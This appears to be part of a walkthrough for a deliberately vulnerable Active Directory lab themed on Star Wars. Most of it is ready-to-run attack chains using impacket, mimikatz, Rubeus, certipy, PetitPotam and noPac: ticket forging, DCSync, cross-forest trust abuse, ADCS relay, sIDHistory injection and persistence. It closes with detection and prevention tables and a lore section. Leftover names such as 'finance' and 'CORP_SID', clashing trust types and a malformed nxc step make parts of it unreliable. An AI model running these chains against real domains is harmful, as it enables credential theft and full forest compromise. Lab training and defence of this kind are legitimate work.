EMPIRE has parent-child trust `empire.local` ↔ `eu.empire.local` and external trusts to
`rebel.local` and `trade.corp`. Pattern G covered `eu` → `corp`. Pattern P is the
same primitive applied to the alternate path (corp → eu) and useful when you
land on `coruscant.eu` first and need to pivot down a tier.

```
empire.local DA  ──DCSync krbtgt─▶  forge inter-realm TGT with /sids:<EU-DA-SID>
                                 ──asktgs cifs/coruscant.eu──▶ EU SYSTEM
```

**Commands:**

```bash
impacket-secretsdump -just-dc-user krbtgt empire.local/Administrator@10.10.0.10
impacket-lookupsid empire.local/Administrator@10.10.0.10 'eu.empire.local' | head
impacket-ticketer -nthash <corp_krbtgt_nt> -domain-sid <CORP_SID> \
                  -domain empire.local -extra-sid <EU_SID>-512 \
                  -spn 'krbtgt/eu.empire.local' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/deathstar.eu.empire.local -impersonate Administrator empire.local/Administrator
impacket-secretsdump -k -no-pass -just-dc eu.empire.local/Administrator@deathstar.eu.empire.local
```

---

## 10g. Wireframe — Pattern Q: Trust Key forge → rebel.local (external trust)

Identical to Pattern I but written out per-EMPIRE-host so the SIDs and DNS names
are concrete. External trust → SID filtering is **disabled** in EMPIRE on every
external trust (the lab spec says so).

```
Dump trust-account hash for REBEL$/empire.local → forge inter-realm TGT
→ TGS for cifs/yavin4.rebel.local → DCSync rebel.local
```

**Commands:**

```bash
# 1. Trust key dump (run as Administrator@empire.local)
impacket-secretsdump -just-dc-user 'REBEL$' empire.local/Administrator@10.10.0.10

# 2. Get finance EA SID
impacket-lookupsid rebel.local/<low_priv>:'<pw>'@10.20.0.10 | grep -i 'enterprise'

# 3. Forge inter-realm TGT
impacket-ticketer -nthash <FINANCE_trustkey_nt> -domain-sid <CORP_SID> \
                  -domain empire.local -extra-sid <FIN_SID>-519 \
                  -spn 'krbtgt/rebel.local' Administrator

# 4. Ask cross-realm TGS and DCSync
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/yavin4.rebel.local -impersonate Administrator empire.local/Administrator
impacket-secretsdump -k -no-pass -just-dc rebel.local/Administrator@yavin4.rebel.local
```

---

## 10h. Wireframe — Pattern R: Tree-Root trust → trade.corp (Golden Cross-Forest)

`trade.corp` is wired as a tree-root trust to `empire.local`. The forge primitive is
the same, but the TGT SPN target changes and the foreign forest's root SID is what
you append.

**Commands:**

```bash
impacket-secretsdump -just-dc-user 'TRADE$' empire.local/Administrator@10.10.0.10
impacket-lookupsid trade.corp/<low_priv>:'<pw>'@10.30.0.10 | grep -i 'enterprise'
impacket-ticketer -nthash <ROOT_trustkey_nt> -domain-sid <CORP_SID> \
                  -domain empire.local -extra-sid <ROOT_SID>-519 \
                  -spn 'krbtgt/trade.corp' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/neimoidia.trade.corp -impersonate Administrator empire.local/Administrator
impacket-secretsdump -k -no-pass -just-dc trade.corp/Administrator@neimoidia.trade.corp
```

---

## 10i. Wireframe — Pattern S: Foreign-Security-Principal (FSP) hijack

Cross-forest group memberships go through Foreign Security Principal objects in
`CN=ForeignSecurityPrincipals,DC=<domain>`. EMPIRE intentionally maps a foreign
principal that *resolves to* a privileged group in the target forest — if you can
write the resolving SID into a group you control on the source side, you escalate
on the target side without touching its DCs.

```
empire.local: own a group whose members include FSP(rebel.local/SID-of-Foo)
rebel.local: SID-of-Foo is in finance Domain Admins via FSP linkage
→ join your account to the source group → become Foo → become DA@finance
```

**Commands:**

```bash
# 1. Find FSPs that point to interesting source-side SIDs
nxc ldap 10.20.0.10 -u svc_x -p '<pw>' --query \
  '(objectClass=foreignSecurityPrincipal)' 'cn'

# 2. Use BloodHound's "Cross-Forest" path query to confirm reachability
# 3. Write yourself into the source-side group that grants the foreign SID
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' \
  --add-computer 'evil$' --groups 'CrossForestGroup'

# 4. Authenticate to rebel.local — your token now carries the foreign SID
impacket-psexec rebel.local/peter.parker:'EmpireLab2024!'@10.20.0.10
```

---

## 10j. Wireframe — Pattern T: Cross-Forest Kerberoast (no creds in foreign forest)

If foreign trust allows TGS issuance for SPNs that resolve in the foreign forest
(common when SID filtering is off), you can kerberoast accounts in `rebel.local`
using a TGT from `empire.local`.

**Commands:**

```bash
# Need a TGT in empire.local first (any user works)
impacket-getTGT empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
export KRB5CCNAME=peter.parker.ccache

# Request TGSes for cross-forest SPNs
impacket-GetUserSPNs -k -no-pass -target-domain rebel.local -dc-ip 10.20.0.10 \
                     -request empire.local/peter.parker -outputfile xforest.kerberoast

hashcat -m 13100 xforest.kerberoast /usr/share/wordlists/rockyou.txt
```

---

## 10k. Wireframe — Pattern U: ADCS Cross-Forest Enrollment (PKINIT from foreign forest)

`endor.empire.local` issues to authenticated users by default. If the cross-forest
trust authenticates the foreign user (it does in EMPIRE — selective auth is off),
the foreign user can enroll in templates in `empire.local` and PKINIT as a
empire.local principal.

**Commands:**

```bash
# 1. From rebel.local (low-priv), scan empire.local templates
certipy find -u svc_x@rebel.local -p '<pw>' -dc-ip 10.20.0.10 \
             -target endor.empire.local -stdout -vulnerable

# 2. Enroll in ESC1 across the trust
certipy req -u svc_x@rebel.local -p '<pw>' -target endor.empire.local \
            -ca EMPIRE-CA -template ESC1Template -upn 'Administrator@empire.local'

# 3. PKINIT → DA@empire.local from a foreign-forest identity
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

---

## 10l. Wireframe — Pattern V: SID Filtering Bypass via SID History injection

EMPIRE disables SID filtering on every external trust (lab spec). Once you have DA
on empire.local you can write `sIDHistory` on a target user to inject any SID,
including foreign EA SIDs.

**Commands:**

```bash
# 1. From DA@empire.local, use mimikatz to inject sIDHistory
# (run on a Windows host that has reachability to the DC)
mimikatz # privilege::debug
mimikatz # sid::add /sid:S-1-5-21-REBEL-519 /sam:peter.parker

# OR via DCShadow primitive (impacket):
impacket-secretsdump -just-dc-user peter.parker empire.local/Administrator@10.10.0.10
# then dcshadow.py to push the sIDHistory attribute

# 2. peter.parker now carries the foreign EA SID in PAC of every TGS
impacket-getTGT empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
impacket-secretsdump -k -no-pass -just-dc rebel.local/peter.parker@yavin4.rebel.local
```

---

## 10m. Wireframe — Pattern W: Cross-forest unconstrained delegation

`svc_legacy@empire.local` has unconstrained delegation enabled (EMPIRE spec). When a
DA from `rebel.local` authenticates to a host running as `svc_legacy`, the host
caches the foreign DA's TGT. Coerce a finance DC to authenticate to your
unconstrained host and you get a usable foreign TGT.

**Commands:**

```bash
# 1. Confirm svc_legacy unconstrained
nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --trusted-for-delegation

# 2. Make a service run as svc_legacy on a host you own; or use scarif if you
#    have local admin there (EMPIRE wires svc_legacy as the scarif service)
#    Then coerce yavin4.rebel.local to authenticate:
impacket-PetitPotam -u peter.parker -p 'EmpireLab2024!' -d empire.local \
                    scarif.empire.local 10.20.0.10

# 3. Dump tickets from LSASS on scarif (Rubeus monitor / mimikatz sekurlsa::tickets)
mimikatz # sekurlsa::tickets /export

# 4. Use the foreign DC's TGT to DCSync rebel.local
KRB5CCNAME=coruscant-finance.ccache impacket-secretsdump -k -no-pass -just-dc rebel.local/coruscant\$@yavin4.rebel.local
```

---

## 10n. Wireframe — Pattern X: noPac across a trust

`noPac` works against the foreign DC if you can reach it and the foreign DC is
unpatched. EMPIRE leaves both child and external DCs unpatched.

**Commands:**

```bash
# Hit rebel.local DC directly with a empire.local user (cross-realm preauth)
impacket-noPac.py rebel.local/svc_x:'<pw>' -dc-ip 10.20.0.10 \
                  -dc-host yavin4.rebel.local -shell --impersonate Administrator
```

---

## 10o. Wireframe — Pattern Y: Cross-forest ADCS ESC11 (NTLM Relay to ICPR)

`ICPR-RPC` doesn't enforce EPA by default. Relay coerced NTLM from one forest's
DC into the *other* forest's CA over RPC and request a cert for the relayed
machine account.

**Commands:**

```bash
# 1. Coerce yavin4.rebel.local to authenticate
impacket-PetitPotam -u svc_x -p '<pw>' -d rebel.local 10.10.0.1 10.20.0.10

# 2. Relay NTLM into endor.empire.local's ICPR
sudo impacket-ntlmrelayx -t 'rpc://endor.empire.local' -rpc-mode ICPR \
                         -icpr-ca-name 'EMPIRE-CA' -template 'Machine' -smb2support
```

---

## 10p. Wireframe — Pattern Z: Diamond + Sapphire forest persistence

Diamond modifies an existing TGT in-place to bump privileges; Sapphire forges
with a PAC pulled live via S4U2Self → no offline guesswork on group bitmaps.
Combined they survive `krbtgt` rotation longer than a Golden because the
encryption context is fresh.

**Commands:**

```bash
# Diamond — modify a real TGT (Rubeus)
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
                   /groups:512,519 /krbkey:<krbtgt_aes256> /ptt

# Sapphire — pull a live PAC via S4U2Self, forge with it
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /id:500 \
                  /domain:empire.local /sid:<CORP_SID> /sapphire /ptt
```

---

## 11. Solving-pattern decision tree

When you have *something* but don't know where to go, walk this tree:

```
┌─ Am I on the host bridge with zero creds? ──┐
│   Yes → Phase 0 (02a-initial-access.md):    │
│   ├── Anon SMB/LDAP/DNS, Kerbrute → users   │
│   ├── AS-REP roast (no creds) → CRED-002    │
│   ├── Password spray → IA-006               │
│   ├── Responder/mitm6 (if you have L2) → IA-008/009 │
│   ├── PetitPotam+relay+ADCS → IA-013        │
│   ├── ZeroLogon → IA-014                    │
│   ├── ProxyShell/PrintNightmare → IA-015/017│
│   ├── Phishing (Pattern J) → IA-019..024    │
│   └── SCCM PXE / USB / VLAN → IA-029/028/030│
│                                              │
└─ Do I have a domain user? ──────────────────┐
│                                  │
│ No  ──── go back to Phase 0      │
│                                  │
│ Yes ───┐                         │
│        ▼                         │
│   ┌─ Run BloodHound ────────────┐│
│   │  Find path to DA            ││
│   └──┬──────────────────────────┘│
│      │                            │
│   Path is...                      │
│      │                            │
│   ├── Kerberoast?  -> Pattern A   │
│   ├── ADCS ESC?   -> Pattern B    │
│   ├── Coerce+ESC8? -> Pattern C   │
│   ├── RBCD?       -> Pattern D    │
│   ├── ACL chain?  -> LAT-017/18/20/21
│   ├── DCSync grant? -> CRED-013   │
│   ├── DnsAdmins?  -> LAT-031      │
│   ├── Server Ops? -> PE-057       │
│   ├── Backup Ops? -> CRED-007     │
│   └── Unconstrained deleg? -> CRED-018 + PrinterBug
│                                  │
└──────────────────────────────────┘

Once DA on empire.local:
   ├── Child forest (eu.empire.local) ──▶ Pattern G (down) / Pattern P (up)
   ├── External forest (rebel.local) ──▶ Pattern Q (trust-key) / Pattern T (xforest Kerberoast) / Pattern U (xforest ADCS) / Pattern V (sIDHistory) / Pattern X (xforest noPac)
   ├── Tree-root trust (trade.corp) ──▶ Pattern R
   ├── Foreign-Security-Principal abuse ──▶ Pattern S
   ├── Unconstrained delegation across trust ──▶ Pattern W
   ├── ESC11 (NTLM relay to ICPR-RPC across trust) ──▶ Pattern Y
   └── Persistence ──▶ Golden / Diamond / Sapphire (Pattern Z) / Golden Cert / AdminSDHolder
```

---

## 12. Detection summary (blue-team view)

| Pattern | Primary signal | Tool |
|---|---|---|
| Kerberoast | 4769 RC4 bulk | Splunk / Sentinel / MDI |
| AS-REP roast | 4768 PreAuth=0 | MDI alert |
| Password spray | 4625/4771 burst | MDI |
| LSASS dump | Sysmon 10 mask 0x1010 | EDR |
| DCSync | 4662 from non-DC IP | MDI |
| Golden Ticket | 4769 no parent 4768 | MDI |
| Silver Ticket | 4624 LT3 with mismatched PAC | hard — needs PAC validation |
| ADCS ESC1/ESC8 | 4886/4887 mismatch | MDI |
| RBCD | 5136 on `msDS-AllowedToActOnBehalfOfOtherIdentity` | MDI |
| noPac | 4741+4742 chain | MDI |
| ZeroLogon | 5827, brute-force 4624 | MDI |
| LLMNR/Responder | LLMNR/NBT-NS traffic burst | MDI / Zeek |
| Coerce (PetitPotam/DFSCoerce/etc.) | RPC pattern + DC$ outbound NTLM | MDI |
| mitm6 | unsolicited DHCPv6 | network IDS |
| Phishing (Pattern J) | Office spawns powershell/cmd; LNK from %TEMP%; LSASS 0x1010 | EDR / Sysmon 1+10 |
| ProxyShell (Pattern L) | /autodiscover.json with @host SSRF; w3wp→powershell | WAF / Exchange audit |
| SCCM PXE (Pattern M) | PXE boot from unknown MAC; abnormal policy retrieval | SCCM audit |
| library-ms / USB-LNK (Pattern N) | Outbound NTLM from client to RFC1918 IP | Zeek / EDR |

---

## 13. Prevention summary (one-line each)

| Vector | Fix |
|---|---|
| LLMNR/NBT-NS | GPO disable + DNS suffix |
| NTLM | Disable where possible; Protected Users |
| SMB signing | Required everywhere |
| LDAP signing + channel binding | Required (KB4520412) |
| WebClient | Disable on servers |
| Kerberoast | AES-only, gMSAs, 25+ char service pwds |
| AS-REP | Clear DONT_REQ_PREAUTH |
| ADCS ESC1 | Drop ENROLLEE_SUPPLIES_SUBJECT |
| ADCS ESC8 | Disable NTLM on web enrollment + EPA |
| RBCD / noPac | MachineAccountQuota=0; patch |
| ZeroLogon | Patch + FullSecureChannelProtection=1 |
| Golden Ticket | Rotate krbtgt twice; tier-0 |
| AdminSDHolder | Alert on any 5136 |
| Cross-forest | SID filtering on; selective auth |
| Unconstrained deleg | Disable entirely; use RBCD |
| Print Spooler on DC | Disable |
| LAPS | Deploy Windows LAPS (encrypted) |
| Tier-0 isolation | Server/Print/Backup Operators must be empty on DCs |

---

That's the lab. If you can solve every pattern above in EMPIRE and explain the corresponding detection + prevention to the blue team, you've earned every flag in `PLAN.md`.

Good hunting.

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!
